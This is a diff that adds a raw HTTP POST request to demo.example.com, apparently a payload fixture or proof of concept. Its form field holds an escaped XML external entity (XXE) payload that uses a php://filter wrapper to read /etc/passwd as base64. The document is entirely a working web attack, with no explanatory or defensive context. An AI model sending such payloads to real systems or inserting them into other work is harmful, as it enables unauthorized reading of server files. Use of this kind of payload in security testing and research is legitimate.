@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 169
+Connection: close
+
+id=\u003C!DOCTYPE r [\u003C!ENTITY x SYSTEM \u0022php://filter/read=convert.base64-encode/resource=/etc/passwd\u0022\u003E]\u003E\u003Cr\u003E\u0026x\u003B\u003C/r\u003E
